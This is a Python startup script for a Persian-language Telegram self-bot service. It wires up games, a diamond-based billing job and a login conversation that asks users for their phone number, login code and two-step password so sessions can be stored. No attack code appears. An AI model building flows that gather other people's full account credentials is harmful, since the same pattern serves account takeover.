import asyncio
import os
import telegram
from telegram import (
    InlineQueryResultArticle, 
    InputTextMessageContent, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    InlineQueryHandler,
    filters,
    JobQueue
)
from handlers.rps_game_handler import register_rps_handlers
from config import BOT_TOKEN, PANEL_BOT_TOKEN, supabase
from handlers.client_manager import load_existing_sessions
from handlers.auth_handler import (
    MAIN_MENU, START_PAYMENT, PHONE, CODE, PASSWORD, ENTER_INVITE_CODE,
    start, handle_main_menu_clicks,
    handle_go_to_pay, handle_activation_payment, handle_cancel_to_menu,
    get_phone, handle_code_calculator_clicks, get_password, cancel
)
from handlers.dice_game import (
    game_buttons_callback,
    handle_balance_request,
    handle_transfer_request,
)
from handlers.panel_handler import handle_panel_clicks

# ⚙️ اینلاین هندلر اختصاصی برای پنل سلف‌بات
async def inline_panel_handler(update, context):
    try:
        inline_query = update.inline_query
        if not inline_query:
            return
            
        query = inline_query.query
        if query == 'get_self_panel':
            user_id = inline_query.from_user.id
            keyboard = [
                [
                    InlineKeyboardButton("👤 اکانت من", callback_data=f"panel_acc_{user_id}"),
                    InlineKeyboardButton("مدیریت و راهنمایی", callback_data=f"panel_sett_{user_id}")
                ],
                [
                    InlineKeyboardButton("❌ بستن پنل", callback_data=f"panel_close_{user_id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            results = [
                InlineQueryResultArticle(
                    id=f"p_{user_id}_{update.update_id}",
                    title="🤖 پنل مدیریت سلف‌بات",
                    description="ارسال منوی مدیریت تودرتو",
                    input_message_content=InputTextMessageContent(
                        f"› **Panel Management**\n\nبه منوی مدیریت هوما خوش آمدید. لطفاً یک بخش را انتخاب کنید:"
                    ),
                    reply_markup=reply_markup
                )
            ]
            await inline_query.answer(results, cache_time=0)
    except Exception as e:
        print(f"Error in async panel inline: {e}")

# 📦 ساختار مدیریت وضعیت سراسری
conv_handler = ConversationHandler(
    entry_points=[
        CommandHandler("start", start),
        MessageHandler(filters.Regex(r"^/start$"), start)
    ],
    states={
        MAIN_MENU: [
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
            CallbackQueryHandler(handle_go_to_pay, pattern="^go_to_pay_\\d+$"),
            CallbackQueryHandler(handle_main_menu_clicks, pattern="^gold_.*$"),
            CallbackQueryHandler(handle_main_menu_clicks, pattern="^.*$"),
        ],
        START_PAYMENT: [
            CallbackQueryHandler(handle_activation_payment, pattern="^pay_activation$"),
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
        ],
        PHONE: [
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
            MessageHandler(filters.CONTACT, get_phone),
            MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
        ],
        CODE: [
            CallbackQueryHandler(handle_code_calculator_clicks, pattern="^code_"),
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
        ],
        PASSWORD: [
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
            MessageHandler(filters.TEXT & ~filters.COMMAND, get_password),
        ],
        ENTER_INVITE_CODE: [
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
            MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: __import__('handlers.auth_handler', fromlist=['process_invite_code_input']).process_invite_code_input(u, c)),
        ],
    },
    fallbacks=[CommandHandler("cancel", cancel), CommandHandler("start", start)],
    allow_reentry=True,
)

async def deduct_diamonds_job(context):
    try:
        res = supabase.table("users_diamonds").select("user_id, diamonds").eq("is_active", True).execute()
        if res.data:
            for user in res.data:
                if user["user_id"] in [8004897709, 8668275780]: continue
                if user["diamonds"] >= 2:
                    supabase.table("users_diamonds").update({"diamonds": user["diamonds"] - 2}).eq("user_id", user["user_id"]).execute()
                else:
                    supabase.table("users_diamonds").update({"is_active": False}).eq("user_id", user["user_id"]).execute()
    except Exception as e:
        print(f"❌ خطا در عملیات کسر الماس: {e}")

async def start_dual_bots():
    os.makedirs("new_sessions", exist_ok=True)
    
    while True: # حلقه اصلی برای بازگشت در صورت بروز خطا
        try:
            print("🚀 در حال مقداردهی سیستم هوما...")
            
            # 1. ساخت اپلیکیشن‌ها
            main_app = Application.builder().token(BOT_TOKEN).job_queue(JobQueue()).build()
            panel_app = Application.builder().token(PANEL_BOT_TOKEN).build()
            
            # 2. ثبت هندلرها (همانند قبل)
            main_app.add_handler(conv_handler)
            main_app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r"^طلا"), handle_balance_request))
            main_app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r"^واریز طلا \d+$"), handle_transfer_request))
            register_rps_handlers(main_app)
            main_app.add_handler(CallbackQueryHandler(game_buttons_callback, pattern="^game_"))
            main_app.job_queue.run_repeating(deduct_diamonds_job, interval=3600, first=60)

            import handlers.panel_handler
            handlers.panel_handler.panel_bot_app = panel_app
            panel_app.add_handler(CallbackQueryHandler(handle_panel_clicks)) 
            panel_app.add_handler(InlineQueryHandler(inline_panel_handler))

            # 3. راه اندازی
            await load_existing_sessions()
            await main_app.initialize()
            await panel_app.initialize()
            await main_app.start()
            await panel_app.start()
            
            # استفاده از restart_on_failure برای پایداری در برابر قطع شدن سرور تلگرام
            await main_app.updater.start_polling(drop_pending_updates=True, restart_on_failure=True)
            await panel_app.updater.start_polling(drop_pending_updates=True, restart_on_failure=True)
            
            print("✅ سیستم هوما با موفقیت فعال شد.")
            
            # انتظار برای همیشه (تا زمانی که خطایی رخ ندهد)
            await asyncio.Event().wait()

        except Exception as e:
            print(f"⚠️ خطای بحرانی در سیستم: {e}")
            print("🔄 در حال تلاش برای شروع مجدد در ۱۰ ثانیه...")
            
            # توقف ایمن قبل از ری‌استارت
            try:
                await main_app.stop()
                await panel_app.stop()
                await main_app.shutdown()
                await panel_app.shutdown()
            except:
                pass
                
            await asyncio.sleep(10)

if __name__ == "__main__":
    try: asyncio.run(start_dual_bots())
    except (KeyboardInterrupt, SystemExit): print("🛑 متوقف شد.")